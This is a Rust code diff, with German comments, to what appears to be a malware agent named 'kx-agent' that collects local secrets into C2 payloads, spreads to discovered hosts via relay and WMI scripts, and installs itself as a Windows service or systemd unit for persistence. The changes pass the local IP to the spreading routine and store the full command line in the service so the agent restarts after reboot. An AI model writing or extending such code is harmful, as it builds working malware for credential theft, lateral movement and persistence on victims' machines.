@@ -122,6 +122,7 @@ async fn main() {
         &discovered,
         &args.relay_script,
         &args.wmi_script,
+        &local_ip(),
     )
     .await;
 
@@ -185,8 +186,13 @@ async fn collect_local_secrets() -> Vec<c2::SecretPayload> {
 }
 
 /// Installiert Persistenz (Windows oder POSIX).
+///
+/// Der vollständige Startbefehl (Binary + alle aktuellen CLI-Argumente) wird
+/// in der Dienstdefinition gespeichert, damit der Agent nach einem Reboot mit
+/// identischen Parametern neu startet und nicht in eine Crashloop gerät.
 async fn install_persistence() -> Result<(), Box<dyn std::error::Error>> {
     let exe = std::env::current_exe()?;
+    let args = build_persistence_args();
     #[cfg(target_os = "windows")]
     {
         kx_win::install_service("kx-agent", &exe, "Kx Agent").await?;
@@ -194,7 +200,35 @@ async fn install_persistence() -> Result<(), Box<dyn std::error::Error>> {
     }
     #[cfg(unix)]
     {
-        kx_posix::install_systemd_service("kx-agent", &exe, "").await?;
+        kx_posix::install_systemd_service("kx-agent", &exe, &args).await?;
     }
     Ok(())
+}
+
+/// Baut die shell-sicheren Startargumente (ohne Binary-Pfad) aus den
+/// aktuellen CLI-Args. Die systemd-Unit hängt diese an den Binary-Pfad an.
+fn build_persistence_args() -> String {
+    std::env::args()
+        .skip(1)
+        .map(|a| escape_arg(&a))
+        .collect::<Vec<_>>()
+        .join(" ")
+}
+
+/// Zitiert ein Argument, um Shell-Injection über Argumente zu verhindern.
+fn escape_arg(arg: &str) -> String {
+    format!("'{}'", arg.replace('\'', "'\\''"))
+}
+
+/// Ermittelt die lokale IP-Adresse, indem ein UDP-Socket ohne Datenversand
+/// mit einer externen Adresse „verbindet" (Standard-Technik).
+fn local_ip() -> String {
+    use std::net::UdpSocket;
+    UdpSocket::bind("0.0.0.0:0")
+        .and_then(|s| {
+            s.connect("8.8.8.8:80")?;
+            s.local_addr()
+        })
+        .map(|a| a.ip().to_string())
+        .unwrap_or_else(|_| "127.0.0.1".to_string())
 }
